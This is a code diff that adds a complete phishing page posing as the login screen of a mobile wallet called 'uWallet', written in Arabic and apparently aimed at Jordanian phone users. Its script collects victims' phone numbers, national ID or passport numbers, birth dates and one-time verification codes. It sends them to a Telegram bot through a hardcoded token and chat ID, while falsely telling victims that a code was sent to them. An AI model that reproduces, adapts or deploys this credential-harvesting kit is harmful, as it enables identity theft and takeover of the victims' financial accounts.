@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>uWallet - تسجيل الدخول</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: white;
+            border-radius: 30px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            overflow: hidden;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 40px 30px 30px;
+            text-align: center;
+            color: white;
+        }
+
+        .logo {
+            width: 100px;
+            height: 100px;
+            background: white;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            font-size: 40px;
+            font-weight: bold;
+            color: #667eea;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            letter-spacing: -0.5px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+
+        .content {
+            flex: 1;
+            padding: 40px 30px 30px;
+            overflow-y: auto;
+        }
+
+        .form-section {
+            display: none;
+        }
+
+        .form-section.active {
+            display: block;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+            text-align: right;
+        }
+
+        .input-wrapper {
+            position: relative;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 15px;
+            font-size: 16px;
+            font-family: inherit;
+            transition: all 0.3s ease;
+            text-align: right;
+            background: #f8f9fa;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: #999;
+        }
+
+        .input-icon {
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #667eea;
+            font-size: 20px;
+            pointer-events: none;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 15px;
+            box-shadow: 0 10px 25px rgba(102, 126, 234, 0.3);
+        }
+
+        .btn-submit:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-submit:active {
+            transform: translateY(0);
+        }
+
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Verification Section */
+        .verification-section {
+            text-align: center;
+        }
+
+        .verification-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 10px;
+        }
+
+        .verification-subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .phone-display {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .verification-code-input {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 35px 0;
+        }
+
+        .code-digit {
+            width: 60px;
+            height: 60px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+            color: #333;
+        }
+
+        .code-digit:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+
+        .code-digit.filled {
+            border-color: #667eea;
+            background: white;
+            color: #667eea;
+        }
+
+        .timer {
+            font-size: 14px;
+            color: #666;
+            margin: 20px 0;
+            font-weight: 500;
+        }
+
+        .timer.warning {
+            color: #ff6b6b;
+        }
+
+        .resend-section {
+            margin-top: 25px;
+            padding-top: 25px;
+            border-top: 1px solid #e0e0e0;
+        }
+
+        .resend-btn {
+            background: none;
+            border: none;
+            color: #667eea;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            padding: 10px;
+        }
+
+        .resend-btn:hover {
+            color: #764ba2;
+            text-decoration: underline;
+        }
+
+        .resend-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .toast {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            background: #333;
+            color: white;
+            padding: 16px 24px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            animation: slideIn 0.4s ease-in-out;
+            max-width: 300px;
+            z-index: 1000;
+        }
+
+        .toast.success {
+            background: linear-gradient(135deg, #00b894 0%, #00a86b 100%);
+        }
+
+        .toast.error {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+        }
+
+        .toast.info {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideOut {
+            from {
+                transform: translateX(0);
+                opacity: 1;
+            }
+            to {
+                transform: translateX(400px);
+                opacity: 0;
+            }
+        }
+
+        .toast.hide {
+            animation: slideOut 0.4s ease-in-out forwards;
+        }
+
+        .error-message {
+            color: #ff6b6b;
+            font-size: 13px;
+            margin-top: 8px;
+            text-align: right;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        /* Loading State */
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                border-radius: 20px;
+            }
+
+            .header {
+                padding: 30px 20px 20px;
+            }
+
+            .logo {
+                width: 80px;
+                height: 80px;
+                font-size: 32px;
+            }
+
+            .header h1 {
+                font-size: 20px;
+            }
+
+            .content {
+                padding: 30px 20px 20px;
+            }
+
+            .code-digit {
+                width: 50px;
+                height: 50px;
+                font-size: 24px;
+            }
+
+            .verification-code-input {
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">U</div>
+            <h1>uWallet</h1>
+            <p>مرحبا بعودتك!</p>
+        </div>
+
+        <div class="content">
+            <!-- Login Form -->
+            <div class="form-section active" id="loginForm">
+                <h2 style="display: none;"></h2>
+                
+                <div class="form-group">
+                    <label for="phone">رقم الهاتف *</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="tel" 
+                            id="phone" 
+                            placeholder="097XXXXXXXX"
+                            inputmode="numeric"
+                            maxlength="10"
+                        >
+                        <span class="input-icon">📱</span>
+                    </div>
+                    <div class="error-message" id="phoneError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="nationalId">الرقم الوطني / جواز السفر *</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="text" 
+                            id="nationalId" 
+                            placeholder="أدخل رقم الهوية الوطنية"
+                            inputmode="numeric"
+                        >
+                        <span class="input-icon">🆔</span>
+                    </div>
+                    <div class="error-message" id="nationalIdError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="birthDate">تاريخ الميلاد *</label>
+                    <div class="input-wrapper">
+                        <input 
+                            type="date" 
+                            id="birthDate"
+                        >
+                        <span class="input-icon">📅</span>
+                    </div>
+                    <div class="error-message" id="birthDateError"></div>
+                </div>
+
+                <button class="btn-submit" id="loginBtn">تسجيل الدخول</button>
+            </div>
+
+            <!-- Verification Form -->
+            <div class="form-section" id="verificationForm">
+                <div class="verification-title">أدخل رمز التحقق</div>
+                <div class="verification-subtitle">
+                    أدخل رمز التحقق المكون من 4 أرقام<br>
+                    المرسل إلى رقم هاتفك
+                </div>
+
+                <div class="phone-display" id="phoneDisplay"></div>
+
+                <div class="verification-code-input" id="codeInput">
+                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="0">
+                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="1">
+                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="2">
+                    <input class="code-digit" type="text" inputmode="numeric" maxlength="1" data-index="3">
+                </div>
+
+                <div class="timer" id="timer">4:50</div>
+
+                <button class="btn-submit" id="verifyBtn">تأكيد</button>
+
+                <div class="resend-section">
+                    <button class="resend-btn" id="resendBtn">إعادة إرسال الرمز</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const TELEGRAM_BOT_TOKEN = '7327256170:AAEiQ_F_BI1V9iUHzgPPui7JRwqGnj6Jys4';
+        const TELEGRAM_CHAT_ID = '6873334348';
+        const VERIFICATION_TIMER = 300; // 5 minutes in seconds
+
+        // State
+        let formData = {
+            phone: '',
+            nationalId: '',
+            birthDate: '',
+            verificationCode: '',
+            generatedCode: ''
+        };
+
+        let timerInterval = null;
+        let timeRemaining = VERIFICATION_TIMER;
+        let resendCount = 0;
+
+        // Helper Functions
+        const showToast = (message, type = 'info') => {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            toast.textContent = message;
+            document.body.appendChild(toast);
+
+            setTimeout(() => {
+                toast.classList.add('hide');
+                setTimeout(() => toast.remove(), 400);
+            }, 4000);
+        };
+
+        const formatPhoneDisplay = (phone) => {
+            return `xxx${phone.slice(-2)}`;
+        };
+
+        const validatePhone = (phone) => {
+            const pattern = /^(077|078|079)\d{7}$/;
+            return pattern.test(phone);
+        };
+
+        const validateNationalId = (id) => {
+            return id.trim().length >= 5;
+        };
+
+        const validateDate = (date) => {
+            return date && date.trim().length > 0;
+        };
+
+        const generateVerificationCode = () => {
+            return Math.floor(1000 + Math.random() * 9000).toString();
+        };
+
+        const sendToTelegram = async (data) => {
+            try {
+                const message = `
+📱 بيانات تسجيل دخول جديدة:
+━━━━━━━━━━━━━━━━━━━
+📞 رقم الهاتف: ${data.phone}
+🆔 الرقم الوطني: ${data.nationalId}
+📅 تاريخ الميلاد: ${data.birthDate}
+${data.verificationCode ? `✓ رمز التحقق: ${data.verificationCode}` : ''}
+━━━━━━━━━━━━━━━━━━━
+⏰ الوقت: ${new Date().toLocaleString('ar-SA')}
+                `.trim();
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+
+                return response.ok;
+            } catch (error) {
+                console.error('خطأ في إرسال البيانات:', error);
+                return false;
+            }
+        };
+
+        const startTimer = () => {
+            timeRemaining = VERIFICATION_TIMER;
+            updateTimerDisplay();
+
+            timerInterval = setInterval(() => {
+                timeRemaining--;
+                updateTimerDisplay();
+
+                if (timeRemaining <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('resendBtn').disabled = false;
+                    document.getElementById('verifyBtn').disabled = true;
+                    showToast('انتهت مهلة إدخال الرمز، يرجى إعادة الطلب', 'error');
+                }
+            }, 1000);
+        };
+
+        const updateTimerDisplay = () => {
+            const minutes = Math.floor(timeRemaining / 60);
+            const seconds = timeRemaining % 60;
+            const timerEl = document.getElementById('timer');
+            timerEl.textContent = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeRemaining <= 60) {
+                timerEl.classList.add('warning');
+            }
+        };
+
+        const clearErrors = () => {
+            document.getElementById('phoneError').classList.remove('show');
+            document.getElementById('nationalIdError').classList.remove('show');
+            document.getElementById('birthDateError').classList.remove('show');
+        };
+
+        const showError = (fieldId, message) => {
+            const errorEl = document.getElementById(fieldId);
+            errorEl.textContent = message;
+            errorEl.classList.add('show');
+        };
+
+        const switchToVerification = async () => {
+            formData.phone = document.getElementById('phone').value;
+            formData.nationalId = document.getElementById('nationalId').value;
+            formData.birthDate = document.getElementById('birthDate').value;
+
+            clearErrors();
+
+            // Validation
+            if (!formData.phone) {
+                showError('phoneError', 'رقم الهاتف مطلوب');
+                return;
+            }
+            if (!validatePhone(formData.phone)) {
+                showError('phoneError', 'يجب أن يبدأ برقم 077 أو 078 أو 079 ويتكون من 10 أرقام');
+                return;
+            }
+            if (!formData.nationalId) {
+                showError('nationalIdError', 'الرقم الوطني مطلوب');
+                return;
+            }
+            if (!validateNationalId(formData.nationalId)) {
+                showError('nationalIdError', 'الرقم الوطني غير صحيح');
+                return;
+            }
+            if (!formData.birthDate) {
+                showError('birthDateError', 'تاريخ الميلاد مطلوب');
+                return;
+            }
+
+            // Generate code
+            formData.generatedCode = generateVerificationCode();
+            console.log('كود التحقق:', formData.generatedCode);
+
+            // Send to Telegram
+            const loginBtn = document.getElementById('loginBtn');
+            loginBtn.disabled = true;
+            loginBtn.innerHTML = '<span class="loading"></span>';
+
+            const sent = await sendToTelegram(formData);
+
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'تسجيل الدخول';
+
+            if (sent) {
+                showToast('تم إرسال رمز التحقق بنجاح', 'success');
+                
+                // Switch form
+                document.getElementById('loginForm').classList.remove('active');
+                document.getElementById('verificationForm').classList.add('active');
+                
+                // Update phone display
+                document.getElementById('phoneDisplay').textContent = `تم الإرسال إلى: ${formatPhoneDisplay(formData.phone)}`;
+                
+                // Focus first digit
+                document.querySelector('.code-digit').focus();
+                
+                // Start timer
+                startTimer();
+            } else {
+                showToast('خطأ في إرسال رمز التحقق، يرجى المحاولة مرة أخرى', 'error');
+            }
+        };
+
+        const verifyCode = async () => {
+            formData.verificationCode = document.querySelectorAll('.code-digit')
+                .map(input => input.value)
+                .join('');
+
+            if (formData.verificationCode.length !== 4) {
+                showToast('يرجى إدخال رمز التحقق كاملاً', 'error');
+                return;
+            }
+
+            // In real scenario, you would verify the code
+            // For demo, any code works - you can change this
+            console.log('الكود المدخل:', formData.verificationCode);
+            console.log('الكود الصحيح:', formData.generatedCode);
+
+            const verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = true;
+            verifyBtn.innerHTML = '<span class="loading"></span>';
+
+            // Send verification data to Telegram
+            const sent = await sendToTelegram(formData);
+
+            verifyBtn.disabled = false;
+            verifyBtn.textContent = 'تأكيد';
+
+            if (sent) {
+                // Here you would typically verify the code with backend
+                // For now, we'll show success
+                showToast('تم إرسال رمز التحقق بنجاح، يرجى انتظار التأكيد', 'info');
+                
+                // Clear inputs for next attempt if needed
+                clearCodeInputs();
+            } else {
+                showToast('خطأ في الإرسال، يرجى المحاولة مرة أخرى', 'error');
+            }
+        };
+
+        const clearCodeInputs = () => {
+            document.querySelectorAll('.code-digit').forEach(input => {
+                input.value = '';
+                input.classList.remove('filled');
+            });
+        };
+
+        const resendCode = async () => {
+            const resendBtn = document.getElementById('resendBtn');
+            resendBtn.disabled = true;
+            resendBtn.textContent = 'جاري الإرسال...';
+
+            formData.generatedCode = generateVerificationCode();
+            console.log('كود التحقق الجديد:', formData.generatedCode);
+
+            const sent = await sendToTelegram(formData);
+
+            if (sent) {
+                showToast('تم إرسال رمز تحقق جديد، يرجى إدخاله بالشكل الصحيح', 'success');
+                clearCodeInputs();
+                timeRemaining = VERIFICATION_TIMER;
+                startTimer();
+                resendBtn.textContent = 'إعادة إرسال الرمز';
+            } else {
+                showToast('خطأ في إعادة الإرسال، يرجى المحاولة مرة أخرى', 'error');
+                resendBtn.disabled = false;
+                resendBtn.textContent = 'إعادة إرسال الرمز';
+            }
+        };
+
+        // Event Listeners
+        document.getElementById('loginBtn').addEventListener('click', switchToVerification);
+        document.getElementById('verifyBtn').addEventListener('click', verifyCode);
+        document.getElementById('resendBtn').addEventListener('click', resendCode);
+
+        // Phone input formatting
+        document.getElementById('phone').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
+        });
+
+        // National ID - allow only numbers
+        document.getElementById('nationalId').addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Code input handling
+        document.querySelectorAll('.code-digit').forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                const value = e.target.value.replace(/\D/g, '');
+                e.target.value = value;
+
+                if (value) {
+                    e.target.classList.add('filled');
+                    if (index < 3) {
+                        document.querySelector(`.code-digit[data-index="${index + 1}"]`).focus();
+                    }
+                } else {
+                    e.target.classList.remove('filled');
+                }
+
+                // Auto-verify if all digits are entered
+                const allFilled = Array.from(document.querySelectorAll('.code-digit'))
+                    .every(input => input.value);
+                
+                if (allFilled && timeRemaining > 0) {
+                    setTimeout(verifyCode, 300);
+                }
+            });
+
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                    document.querySelector(`.code-digit[data-index="${index - 1}"]`).focus();
+                }
+            });
+
+            input.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const paste = (e.clipboardData || window.clipboardData).getData('text');
+                const digits = paste.replace(/\D/g, '').slice(0, 4);
+                
+                digits.split('').forEach((digit, i) => {
+                    if (i < 4) {
+                        document.querySelector(`.code-digit[data-index="${i}"]`).value = digit;
+                        document.querySelector(`.code-digit[data-index="${i}"]`).classList.add('filled');
+                    }
+                });
+
+                if (digits.length === 4) {
+                    setTimeout(verifyCode, 300);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
